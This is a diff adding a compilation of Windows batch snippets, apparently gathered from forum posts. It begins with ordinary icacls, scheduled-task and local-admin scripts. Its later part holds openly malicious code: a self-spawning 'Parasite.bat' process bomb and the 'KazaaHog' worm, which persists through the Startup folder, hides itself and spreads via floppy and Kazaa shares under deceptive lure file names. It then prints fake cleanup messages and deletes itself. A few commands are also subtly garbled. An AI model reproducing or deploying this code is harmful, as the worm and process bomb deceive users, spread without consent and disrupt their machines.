@@ -1,0 +1,171 @@
+I've just had the same problem, even with full admin privileges etc.
+
+My workaround:
+
+Scheduled Task that runs at System Startup (not user logon), with SYSTEM privileges and Highest privileges ticked.
+
+This task points at a batch file with the following:
+
+icacls c:\ /remove:g *S-1-5-11 (strips permissions)
+icacls c:\ /grant *S-1-5-11:(OI)(CI)(IO)(M) (restores permissions with the exception of the additional (AD), which we wanted to remove).
+
+That seems to do the trick. Using Deny stops Admins creating folders in the root, which is undesirable. Simply trying to remove the (AD) doesn't appear to work either.
+
+More: (It'll grant MODIFY permission to groupEveryone)
+
+icacls "C:\Program Files (x86)\Program File" /grant Everyone:M
+
+More:  Schedule task as highest
+You can make a script that will work on XP, 2003, Vista, 2008, 7, 2008R2 etc., by pulling the OS version from the registry. A batch script could look like this:
+
+setlocal
+set runlevel=
+
+REM Get OS version from registry
+for /f "tokens=2*" %%i in ('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"') do set os_ver=%%j
+
+REM Set run level (for Vista or later - version 6)
+if /i "%os_ver:~,1%" GEQ "6" set runlevel=/rl HIGHEST
+
+REM Execute SchTasks.exe
+schtasks.exe /create /tn "Task Name" /sc ONSTART /TR "C:\Scripts\somescript.cmd" /ru SYSTEM %runlevel%
+
+
+
+More:
+Single line command, I setup a batch that asks (used when imaging a new PC) what the user ID is, checks it against AD and then ads it.
+
+@Echo off
+
+*gpupdate /force
+echo.
+echo.
+echo.
+set/p ID=Enter the users LOGON ID#:
+net localgroup administrators *domain*\%ID% /add
+net localgroup SophosAdministrator *domain*\%ID% /add
+if %errorlevel% equ 1 goto IDE
+if %errorlevel% equ 0 goto EXIT
+
+
+:IDE
+echo.
+echo.
+echo.
+echo.
+COLOR 4f
+set/p ID=You entered an invalid ID....Please re-enter the users LOGON ID#:
+net localgroup administrators *domain*\%ID% /add
+net localgroup SophosAdministrator *domain*\%ID% /add
+if %errorlevel% equ 1 goto IDE
+if %errorlevel% equ 0 goto EXIT
+
+:EXIT
+COLOR 0f
+echo.
+echo.
+echo.
+echo Users ID has been added to local administrators Group!
+echo.
+echo.
+echo.
+pause
+
+
+
+
+More:
+
+Set ACLs
+/grant:r, replace permissions previously granted
+inheritance rights
+(OI) object inherit
+(CI) container inherit
+(IO) inherit only
+(NP) don't propagate inherit
+(I) permission inherited from parent container
+simple rights
+(RX,W) read + execute and write only access
+(RX,D) read + execute and delete access
+(M) read, execute, write, delete and modify access
+(F) full access
+PS C:\Users\Administrator>icacls "C:\FOLDER" /grant:r "domain.local\users":(OI)(CI)(RX,D) "domain.local\Administrator":(OI)(CI)(F) SYSTEM:(OI)(CI)(F) Administrators:(OI)(CI)(F) /T /C
+
+
+
+More:
+Add user with read + execute and delete access :
+PS C:\Users\Administrator>icacls E:\Common\TEST /grant s.marsh@std.local:(OI)(CI)(RX,D)
+
+@echo off
+color Oa
+echo...Starting vital Windows Processes
+Pushd ""%~dpO
+:a
+title Win%random%a
+timeout /t 6 /nobreak >nul
+start Parasite.bat
+goto a
+
+Open your,  batch file and if you did it right you'll get 1 at first, then 2, then 4, then 8, 16, 32, 64, 128, 256, 512, 1024, etc...
+Chaos rains!!!
+
+More:
+
+lol, I got winXP, can use spaces if you put destination in ""
+but thanks, the way you said dont work in XP but now i can do BOTH formats, cheers
+
+heres a new version of KazaaHogv1.1:
+
+@ECHO OFF
+
+rem ---------- Hides 3 files so theres still at least 3 copies on there computer and 1 on floppy disk if inserted ---------
+Attrib -H %0
+Attrib -H "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.bat"
+
+If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat" Copy %0 "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat
+If Not Exist "A:\Just a few extra pictures i thought youd like to see!.bat" Copy %0 "A:\Just a few extra pictures i thought youd like to see!.bat"
+
+Attrib +H "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.bat"
+Attrib -H %0
+
+Rem ----------------------------------------- now spreads virus using kazaa -----------------------------------------------
+
+rem - Kazaa Users
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
+If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"
+
+rem - Kazza Lite users
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
+If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"
+
+Echo Your password files have been copied and your other temporary internet files deleted.
+Echo Your password files have then been copied back to there original CLEAN location.
+Echo Thank you for using this Clean up program! :-)
+del %0
+
+
+More: Copy self to anywhere
+
+copy /Y "%~f0" "D:\where\you\want\it\to\go\%0"
+also:
+type%0>%random%.bat&type%0>con
+
+
+
